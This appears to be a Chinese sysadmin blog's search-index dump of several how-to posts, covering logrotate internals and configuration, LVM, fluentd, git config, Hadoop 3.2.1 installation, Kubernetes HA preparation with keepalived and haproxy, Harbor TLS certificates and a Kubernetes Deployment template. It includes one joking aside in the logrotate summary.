这个方案的思路是把正在输出的日志拷(copy)一份出来，再清空(trucate)原来的日志。详细步骤如下： 拷贝程序当前正在输出的日志文件，保存文件名为滚动结果文件名。这期间程序照常输出日志到原来的文件中，原来的文件名也没有变。 清空程序正在输出的日志文件。清空后程序输出的日志还是输出到这个日志文件中，因为清空文件只是把文件的内容删除了，文件的inode编号并没有发生变化，变化的是元信息中文件内容的信息。 结果上看，旧的日志内容存在滚动的文件里，新的日志输出到空的文件里。实现了日志的滚动。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:4:0","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"这个方案有两个有趣的地方。 文件清空并不影响到输出日志的程序的文件表里的文件位置信息，因为各进程的文件表是独立的。那么文件清空后，程序输出的日志应该接着之前日志的偏移位置输出，这个位置之前会被\\0填充才对。但实际上logroate清空日志文件后，程序输出的日志都是从文件开始处开始写的。这是怎么做到的？这个问题让我纠结了很久，直到某天灵光一闪，这不是logrotate做的，而是成熟的写日志的方式，都是用O_APPEND的方式写的。如果程序没有用O_APPEND方式打开日志文件，变会出现copytruncate后日志文件前面会被一堆\\0填充的情况。 日志在拷贝完到清空文件这段时间内，程序输出的日志没有备份就清空了，这些日志不是丢了吗？是的，copytruncate有丢失部分日志内容的风险。所以能用create的方案就别用copytruncate。所以很多程序提供了通知我更新打开日志文件的功能来支持create方案，或者自己做了日志滚动，不依赖logrotate。 ","date":"2020-07-28 17:25","objectID":"/post/1903/:4:1","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"总结 logrotate是个优秀的日志滚动工具，它是用蜂蜜，川贝，桔梗，加上天山雪莲配制而成，不须冷藏，也没有防腐剂，除了毒性猛烈之外，味道还很好吃。实在是居家旅行、杀人灭口必备良药！ ","date":"2020-07-28 17:25","objectID":"/post/1903/:5:0","tags":["log"],"title":"logrotate机制和原理","uri":"/post/1903/"},{"categories":["基础内容"],"content":"命令 # 尝试日志切割(不会真正切割) logrotate -d /etc/logrotate.d/xxx # 强制尝试日志切割(不会真正切割，未达到切割时间也会模拟执行切割操作) logrotate -d -f /etc/logrotate.d/xxx # 强制切割 logrotate -f /etc/logrotate.d/xxx /etc/cron.daily/logrotate中有个任务每天执行 ","date":"2020-07-28 16:45","objectID":"/post/1902/:1:0","tags":["log"],"title":"logrotate日志切割归档","uri":"/post/1902/"},{"categories":["基础内容"],"content":"默认配置文件 vim /etc/logrotate.conf # see \"man logrotate\" for details # 切割周期,daily-每天切割, weekly-每周切割, monthly-每月切割, weekly # 默认保留4个文件 rotate 4 # 切割后创建新的日志文件 create # 使用日期做为切割后文件的后缀名 dateext # 切割后的日志压缩 #compress # RPM packages drop log rotation information into this directory include /etc/logrotate.d # no packages own wtmp and btmp -- we'll rotate them here /var/log/wtmp { monthly # 每月切割 create 0664 root utmp # 创建日志文件的权限、属主和属组 minsize 1M # 日志大于等于1M才会切割 rotate 1 # 保留一个日志 } /var/log/btmp { missingok # 切割期间丢失的日志，错误忽略 monthly # 每月切割 create 0600 root utmp # 创建日志文件的权限、属主和属组 rotate 1 # 保留一个日志 } ","date":"2020-07-28 16:45","objectID":"/post/1902/:2:0","tags":["log"],"title":"logrotate日志切割归档","uri":"/post/1902/"},{"categories":["基础内容"],"content":"常用参数： # weekly、daily、monthly、yearly切割周期，hourly需要自己修改定时任务 daily # 保留10个日志 rotate 10 # create和下面的copytruncate二选一 # 如果程序支持重新加载配置、重写日志，例如nginx create 0644 www root # 如果程序不支持重新加载配置，为了不影响日志写入，可以使用copytruncate。例如redis,nohup copytruncate # 压缩切割后的日志文件 compress # 使用日期做为切割后文件的后缀名 dateext # 日期格式，仅支持%Y%m%d%H%s dateformat -%Y%m%d.%s # 使用昨天的日期 dateyesterday # 保留.log扩展名 extension .log # 日志为空不切割 notifempty # 如果日志文件不存在，不会发出错误 missingok # 切割后的日志文件放到指定的目录 olddir /backup/logs/ # olddir指定的目录不存在，则会创建该目录 createolddir 755 root root # 定期切割日志时会判断文件大小，达到2M才会切割(可以使用k,M,G单位) minsize 2M # 当文件达到5M，即使没有达到切割周期也会切割日志(需要单独写定时任务) maxsize 5M 执行脚本部分 sharescripts prerotate echo \"切割日志前执行\" endscript postrotate echo \"切割日志后执行\" endscript ","date":"2020-07-28 16:45","objectID":"/post/1902/:3:0","tags":["log"],"title":"logrotate日志切割归档","uri":"/post/1902/"},{"categories":["基础内容"],"content":"模板： # 日志路径 /var/log/xxx/*.log { daily rotate 10 create 0644 www root dateext compress notifempty missingok sharedscripts postrotate /bin/kill -USR1 `cat /run/nginx.pid 2\u003e/dev/null` 2\u003e/dev/null || true endscript } ","date":"2020-07-28 16:45","objectID":"/post/1902/:4:0","tags":["log"],"title":"logrotate日志切割归档","uri":"/post/1902/"},{"categories":["基础内容"],"content":"原文链接：https://linux.cn/article-5117-1.html 1.在名为vg_newlvm的卷组中创建15G大小的逻辑卷： lvcreate -L 15G vg_newlvm 2.在名为vgnewlvm的卷组中创建大小为2500MB的逻辑卷，并命名为centos7newvol，这样就创建了块设备/dev/vgnewlvm/centos7newvol： lvcreate -L 2500 -n centos7_newvol vg_newlvm 3.可以使用lvcreate命令的参数-l来指定逻辑卷扩展的大小。也可以使用这个参数以卷组的大小百分比来扩展逻辑卷。这下列的命令创建了centos7newvol卷组的50%大小的逻辑卷vgnewlvm: lvcreate -l 50%VG -n centos7_newvol vg_newlvm 4.使用卷组剩下的所有空间创建逻辑卷 lvcreate --name centos7newvol -l 100%FREE vgnewlvm ","date":"2020-07-24 17:55","objectID":"/post/1900/:0:0","tags":["lvm"],"title":"4个lvcreate命令例子","uri":"/post/1900/"},{"categories":["基础内容"],"content":" 94105-dsc4huyofum.png PV：物理卷 PE：LVM的最小资源单位，每个PE的大小可以更改，默认4M VG：卷组，在PV的基础上建立 LV：逻辑卷，在VG的基础上建立，理解为分区，可以改动大小 ","date":"2020-07-24 13:38","objectID":"/post/1896/:0:0","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"创建使用pv、vg、lv ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:0","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"1.创建普通分区，我这里已经有一个sdb2分区了 80785-qnldp7k6hd.png ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:1","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"2.创建pv pvcreate /dev/sdb2 ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:2","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"3.创建vg # 可以指定多个分区，我这里只有一个 vgcreate data /dev/sdb2 #将vg设置为活动状态 vgchange -ay data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:3","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"4.创建lv 使用-l 100%VG这个参数以卷组的大小百分比来扩展逻辑卷 lvcreate -l 100%VG -n datalv data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:4","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"5.格式化文件系统 mkfs.xfs /dev/mapper/data-datalv centos6使用：mkfs.ext4 /dev/mapper/data-datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:5","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"6.挂载 # 创建挂载点 mkdir /data mount /dev/mapper/data-datalv /data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:6","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"7.设置开机自动挂载 vim /etc/fstab /dev/mapper/data-datalv /data xfs defaults 0 0 ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:7","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"扩容： ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:0","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"1.扩展vg 直接将/dev/sdc这块硬盘作为PV使用，加入到data这个vg里 vgextend data /dev/sdc 从vg中移除pv：vgreduce data /dev/sdc ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:1","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"2.扩展lv # 添加剩余空间的100%大小 lvextend -l +100%FREE /dev/mapper/data-datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:2","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["基础内容"],"content":"3.扩展文件系统 xfs_growfs /dev/data/datalv centos6使用：resize2fs /dev/data/datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:3","tags":["lvm"],"title":"使用LVM挂载分区","uri":"/post/1896/"},{"categories":["ELK日志收集"],"content":"官方文档 \u003csource\u003e @type tail path /var/log/nginx/access.log pos_file /tmp/nginx.log.pos tag nginx.access \u003cparse **\u003e @type nginx expression /^(?\u003cremote\u003e[^ ]*) (?\u003chost\u003e[^ ]*) (?\u003cuser\u003e[^ ]*) \\[(?\u003ctime\u003e[^\\]]*)\\] \"(?\u003cmethod\u003e\\S+)(?: +(?\u003cpath\u003e[^\\\"]*?)(?: +\\S*)?)?\" (?\u003ccode\u003e[^ ]*) (?\u003csize\u003e[^ ]*)(?: \"(?\u003creferer\u003e[^\\\"]*)\" \"(?\u003cagent\u003e[^\\\"]*)\"(?:\\s+(?\u003chttp_x_forwarded_for\u003e[^ ]+))?)?$/ \u003c/parse\u003e \u003c/source\u003e \u003cfilter nginx.**\u003e @type record_transformer \u003crecord\u003e name \"soulchild\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch nginx.**\u003e @type kafka2 brokers 10.0.0.190:9092,10.0.0.191:9092,10.0.0.192:9092 topic_key nginx_tag default_topic nginx.access \u003cbuffer\u003e flush_interval 5s \u003c/buffer\u003e \u003cformat\u003e @type json \u003c/format\u003e \u003c/match\u003e ","date":"2020-07-24 08:48","objectID":"/post/1886/:0:0","tags":["fluentd"],"title":"fluentd收集nginx日志并输出到kafka","uri":"/post/1886/"},{"categories":["其他"],"content":"git配置的三个级别 --local: 仓库级(仅针对某个git仓库.git/config) --global: 用户级(系统用户的配置~/.gitconfig) --system: 系统级(git级配置/private/etc/gitconfig) 修改信息 git config --local user.name 'SoulChild' git config --local user.email '742899387@qq.com' ","date":"2020-07-15 13:45","objectID":"/post/2712/:0:0","tags":[],"title":"git设置提交者信息","uri":"/post/2712/"},{"categories":["hadoop"],"content":"HDFS的守护进程分别是NameNode, SecondaryNameNode,DataNode. YARN的守护进程分别是ResourceManager, NodeManager,WebAppProxy. ","date":"2020-07-13 15:30","objectID":"/post/1877/:0:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"一、安装前准备： |主机名|IP|角色| |- |hadoop-01| 10.0.0.150|namenode、datanode、resourcemanager、nodemanager| |hadoop-02| 10.0.0.151|datanode、nodemanager| |hadoop-03| 10.0.0.152|datanode、nodemanager| ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"1.hosts解析： 三台机器配置 cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.0.150 hadoop-01 10.0.0.151 hadoop-02 10.0.0.152 hadoop-03 EOF ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:1","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"2.配置免密登陆 # 创建用户 useradd hadoop su hadoop ssh-keygen -P '' -t rsa -f ~/.ssh/id_rsa cat ~/.ssh/id_rsa.pub \u003e\u003e authorized_keys chmod 600 ~/.ssh/authorized_keys # 发送配置到其他机器 for i in {151..152};do scp -rp ~/.ssh/ root@10.0.0.$i:/home/hadoop/;done for i in {151..152};do ssh root@10.0.0.$i chown -R hadoop:hadoop /home/hadoop/;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:2","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"3.准备安装包： 三台机器配置 mkdir /server/packages -p cd /server/packages [root@hadoop-01 packages]# ls /server/packages/ hadoop-3.2.1.tar.gz jdk-8u221-linux-x64.tar.gz # 发送软件包到其他节点 for i in {151..152};do scp ./* hadoop@10.0.0.$i:`pwd`;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:3","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"二、安装jdk： 三台机器配置 tar xf jdk-8u221-linux-x64.tar.gz mv jdk1.8.0_221/ /usr/local/jdk ","date":"2020-07-13 15:30","objectID":"/post/1877/:2:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"三、安装hadoop 三台机器配置 tar xf hadoop-3.2.1.tar.gz mv hadoop-3.2.1 /usr/local/hadoop chown -R hadoop.hadoop /usr/local/hadoop ","date":"2020-07-13 15:30","objectID":"/post/1877/:3:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"四、配置环境变量 三台机器配置 echo 'export JAVA_HOME=/usr/local/jdk' \u003e\u003e /etc/profile echo 'export HADOOP_HOME=/usr/local/hadoop' \u003e\u003e /etc/profile echo 'export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin' \u003e\u003e /etc/profile source /etc/profile ","date":"2020-07-13 15:30","objectID":"/post/1877/:4:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"五、配置hadoop 在每个节点配置JAVA_HOME su hadoop cd /usr/local/hadoop sed -i 's@# export JAVA_HOME=@export JAVA_HOME=/usr/local/jdk@' etc/hadoop/hadoop-env.sh etc/hadoop/core-site.xml \u003cconfiguration\u003e \u003cproperty\u003e \u003c!--使用默认文件系统--\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003c!--指定文件系统的IP和端口--\u003e \u003cvalue\u003ehdfs://hadoop-01:9000\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e etc/hadoop/hdfs-site.xml \u003c!--默认值3,hdfs存储数据的副本数--\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e3\u003c/value\u003e \u003c/property\u003e \u003c!--dfs namenode web界面的监听地址--\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.http-address\u003c/name\u003e \u003cvalue\u003ehadoop-01:9870\u003c/value\u003e \u003c/property\u003e \u003c!-- dfs保存namenode数据的路径--\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003e/data/hadoop/hdfs/name\u003c/value\u003e \u003c/property\u003e \u003c!-- dfs保存datanode数据的路径--\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003e/data/hadoop/hdfs/data\u003c/value\u003e \u003c/property\u003e etc/hadoop/yarn-site.xml 配置ResourceManager和NodeManager: \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ehadoop-01\u003c/value\u003e \u003c/property\u003e etc/hadoop/mapred-site.xml 配置MapReduce \u003cproperty\u003e \u003c!--执行框架设置为YARN--\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e 添加工作节点信息 cat \u003e etc/hadoop/workers \u003c\u003cEOF hadoop-01 hadoop-02 hadoop-03 EOF 复制配置文件 cd /usr/local/hadoop for i in {151..152};do scp -rp etc/hadoop/* 10.0.0.$i:`pwd`/etc/hadoop;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:5:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"6.启动hdfs # 格式化文件系统 hdfs namenode -format # 启动nodename hdfs --daemon start namenode hdfs --daemon start datanode hadoop-02，hadoop-03启动datanode hdfs --daemon start datanode ","date":"2020-07-13 15:30","objectID":"/post/1877/:6:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"7.启动yarn hadoop-01启动resourcemanager、nodemanager yarn --daemon start resourcemanager yarn --daemon start nodemsnager hadoop-02、hadoop-03启动nodemanager yarn --daemon start nodemanager hdfs web界面： http://hadoop-01:9870 yarn web界面： http://hadoop-01:8088/cluster/nodes ","date":"2020-07-13 15:30","objectID":"/post/1877/:7:0","tags":["hadoop"],"title":"hadoop3.2.1集群部署","uri":"/post/1877/"},{"categories":["hadoop"],"content":"1.安装jdk： tar xf jdk-8u221-linux-x64.tar.gz mv jdk1.8.0_221 /usr/local/jdk ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:1","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"2.安装hadoop： wget https://mirrors.bfsu.edu.cn/apache/hadoop/common/hadoop-3.2.1/hadoop-3.2.1.tar.gz mv hadoop-3.2.1 /usr/local/hadoop useradd hadoop chown -R hadoop.hadoop /usr/local/hadoop ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:2","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"3.配置环境变量 echo 'export JAVA_HOME=/usr/local/jdk' \u003e\u003e /etc/profile echo 'export HADOOP_HOME=/usr/local/hadoop' \u003e\u003e /etc/profile echo 'export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin' \u003e\u003e /etc/profile ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:3","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"4.设置主机名，配置hosts解析 hostnamectl set-hostname hadoop echo '127.0.0.1 hadoop' \u003e\u003e /etc/hosts ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:4","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"5.配置免密通信 su hadoop ssh-keygen -t rsa -f ~/.ssh/id_rsa -P '' cat ~/.ssh/id_rsa.pub \u003e\u003e ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:5","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"5.修改hadoop配置 su hadoop vim /usr/local/hadoop/etc/hadoop/hadoop-env.sh export JAVA_HOME=/usr/local/jdk vim /usr/local/hadoop/etc/hadoop/core-site.xml: \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://hadoop:9000\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e vim /usr/local/hadoop/etc/hadoop/hdfs-site.xml \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e1\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:6","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["hadoop"],"content":"6.在本地运行MapReduce任务 6.1 格式化文件系统 hdfs namenode -format 6.2 启动NameNode守护程序和DataNode守护程序： /usr/local/hadoop/sbin/start-dfs.sh 可以通过浏览器访问验证：http://xx.xx.xx.xx:9870 6.3 创建hdfs目录 su hadoop hdfs dfs -mkdir /user bin/hdfs dfs -mkdir /user/hadoop 6.4 将input file复制到分布式文件系统hdfs hdfs dfs -mkdir input hdfs dfs -put etc/hadoop/*.xml input 6.5 运行一个示例 hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.2.1.jar grep input output 'dfs[a-z.]+' 6.6 检查输出文件：将输出文件从分布式文件系统hdfs复制到本地文件系统并检查它们： hdfs dfs -get output output cat output/* ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:7","tags":["hadoop"],"title":"hadoop3.2.1伪分布式模式安装","uri":"/post/1876/"},{"categories":["kubernetes"],"content":"1.host解析 cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.0.10 k8s-master01 10.0.0.11 k8s-master02 10.0.0.12 k8s-master03 10.0.0.5 k8s-master EOF 2.安装依赖包 yum install -y epel-release conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget unzip net-tools 3.关闭防火墙 systemctl stop firewalld systemctl disable firewalld iptables -F \u0026\u0026 iptables -X \u0026\u0026 iptables -F -t nat \u0026\u0026 iptables -X -t nat iptables -P FORWARD ACCEPT 4.关闭selinux setenforce 0 sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 5.优化内核参数 modprobe br_netfilter cat \u003e kubernetes.conf \u003c\u003cEOF net.bridge.bridge-nf-call-iptables=1 net.bridge.bridge-nf-call-ip6tables=1 net.ipv4.ip_forward=1 net.ipv4.tcp_tw_recycle=0 net.ipv4.neigh.default.gc_thresh1=1024 net.ipv4.neigh.default.gc_thresh2=2048 net.ipv4.neigh.default.gc_thresh3=4096 vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它 vm.overcommit_memory=1 # 不检查物理内存是否够用 vm.panic_on_oom=0 # 开启 OOM fs.inotify.max_user_instances=8192 fs.inotify.max_user_watches=1048576 fs.file-max=52706963 fs.nr_open=52706963 net.ipv6.conf.all.disable_ipv6=1 net.netfilter.nf_conntrack_max=2310720 EOF cp kubernetes.conf /etc/sysctl.d/kubernetes.conf sysctl -p /etc/sysctl.d/kubernetes.conf ipvs配置 modprobe ip_vs_rr cat \u003e /etc/sysconfig/modules/ipvs.modules \u003c\u003cEOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026\u0026 bash /etc/sysconfig/modules/ipvs.modules \u0026\u0026 lsmod | grep -e ip_vs -e nf_conntrack_ipv4 6.安装keepalived yum install -y keepalived 7.配置keepalived,另外两台也需要配置，需要修改router_id、 cat \u003e /etc/keepalived/keepalived.conf \u003c\u003c EOF global_defs { router_id k8s-master01 } vrrp_script check_haproxy { #根据进程名称检测进程是否存在 script \"killall -0 haproxy\" #每3秒检查一次 interval 3 #检测失败会减少2的权值 weight -2 #10次检测失败才为失败状态 fall 10 #2次检测成功才为正常状态 rise 2 } vrrp_instance VI_1 { state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass soulchild } virtual_ipaddress { 10.0.0.5 } track_script { check_haproxy } } EOF 启动 systemctl enable keepalived \u0026\u0026 systemctl start keepalived 8.安装配置haproxy yum install -y haproxy cat \u003e /etc/haproxy/haproxy.cfg \u003c\u003c EOF #--------------------------------------------------------------------- # Global settings #--------------------------------------------------------------------- global # to have these messages end up in /var/log/haproxy.log you will # need to: # 1) configure syslog to accept network log events. This is done # by adding the '-r' option to the SYSLOGD_OPTIONS in # /etc/sysconfig/syslog # 2) configure local2 events to go to the /var/log/haproxy.log # file. A line like the following can be added to # /etc/sysconfig/syslog # # local2.* /var/log/haproxy.log # log 127.0.0.1 local2 chroot /var/lib/haproxy pidfile /var/run/haproxy.pid maxconn 4000 user haproxy group haproxy daemon # turn on stats unix socket stats socket /var/lib/haproxy/stats #--------------------------------------------------------------------- # common defaults that all the 'listen' and 'backend' sections will # use if not designated in their block #--------------------------------------------------------------------- defaults mode http log global option httplog option dontlognull option http-server-close option forwardfor except 127.0.0.0/8 option redispatch retries 3 timeout http-request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http-keep-alive 10s timeout check 10s maxconn 3000 #--------------------------------------------------------------------- # kubernetes apiserver frontend which proxys to the backends #--------------------------------------------------------------------- frontend kubernetes-apiserver mode tcp bind *:8443 option tcplog default_backend kubernetes-apiserver #--------------------------------------------------------------------- # round robin balancing between the various backends #------------------------------------------------------------","date":"2020-07-10 13:11","objectID":"/post/1875/:0:0","tags":["k8s"],"title":"kubeadm堆叠方案部署k8s高可用集群","uri":"/post/1875/"},{"categories":["docker","kubernetes"],"content":"一、下载安装包 wget https://github.com/goharbor/harbor/releases/download/v2.0.1/harbor-online-installer-v2.0.1.tgz ","date":"2020-07-07 08:59","objectID":"/post/1874/:1:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"二、解压 tar xf harbor-online-installer-v2.0.1.tgz -C /usr/local/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:2:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"三、配置https访问 1.创建目录 mkdir /data/harbor/cert -p cd /data/harbor/cert ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"配置证书颁发机构 1.生成CA证书私钥 openssl genrsa -out ca.key 4096 2.生成CA证书 openssl req -x509 -new -nodes -sha512 -days 3650 \\ -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=soulchild/OU=myharbor/CN=registry.com\" \\ -key ca.key \\ -out ca.crt 字段含义： C:国家 ST:省份 L:城市 O:组织单位 OU:其他内容 CN:一般填写域名 ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:1","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"配置服务器证书 生成私钥 openssl genrsa -out registry.com.key 4096 2.生成证书签名请求（CSR） openssl req -sha512 -new \\ -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=soulchild/OU=myharbor/CN=registry.com\" \\ -key registry.com.key \\ -out registry.com.csr 生成x509 v3扩展文件 cat \u003e v3.ext \u003c\u003c-EOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1=registry.com DNS.2=registry DNS.3=harbor EOF 4.使用v3.ext文件为Harbor主机生成证书 openssl x509 -req -sha512 -days 3650 \\ -extfile v3.ext \\ -CA ca.crt -CAkey ca.key -CAcreateserial \\ -in registry.com.csr \\ -out registry.com.crt ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:2","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"提供证书给Harbor和Docker openssl x509 -inform PEM -in registry.com.crt -out registry.com.cert mkdir -p /etc/docker/certs.d/registry.com/ cp /data/harbor/cert/registry.com.crt /etc/docker/certs.d/registry.com/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:3","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"四、配置harbor 修改如下配置 hostname: registry.com https: # https port for harbor, default is 443 port: 443 # The path of cert and key files for nginx certificate: /data/harbor/cert/registry.com.crt private_key: /data/harbor/cert/registry.com.key data_volume: /data/harbor ","date":"2020-07-07 08:59","objectID":"/post/1874/:4:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"五、安装harbor cd harbor/ ./install.sh ","date":"2020-07-07 08:59","objectID":"/post/1874/:5:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"六、访问 添加解析，修改hosts 10.0.0.50 registry.com 打开访问：https://registry.com/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:6:0","tags":["docker","k8s"],"title":"harbor2.0.1安装部署","uri":"/post/1874/"},{"categories":["kubernetes"],"content":" apiVersion: v1 kind: Service metadata: labels: app: gateway name: gateway namespace: {nameSpace} spec: ports: - name: gateway port: 80 protocol: TCP targetPort: http selector: app: gateway type: ClusterIP --- apiVersion: apps/v1 kind: Deployment metadata: name: gateway namespace: {nameSpace} spec: replicas: {replicas} selector: matchLabels: app: gateway template: metadata: labels: app: gateway spec: imagePullSecrets: - name: registry-secret containers: - name: gateway resources: requests: cpu: {request_cpu} memory: {request_memory} limits: cpu: {limit_cpu} memory: {limit_memory} image: {imageName} ports: - containerPort: 80 name: http env: - name: JAVA_OPTS value: \"-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MinRAMPercentage=70.0 -XX:MaxRAMPercentage=80.0 -XX:+HeapDumpOnOutOfMemoryError\" command: [\"/bin/sh\"] args: [\"-c\",\"java $JAVA_OPTS -Dspring.profiles.active={deployEnv} -Djava.security.egd=file:/dev/./urandom -jar /gateway.jar\"] readinessProbe: httpGet: path: /actuator/info port: http scheme: HTTP initialDelaySeconds: 30 periodSeconds: 30 failureThreshold: 5 successThreshold: 1 timeoutSeconds: 30 livenessProbe: httpGet: path: /actuator/info port: http scheme: HTTP initialDelaySeconds: 60 periodSeconds: 30 failureThreshold: 3 successThreshold: 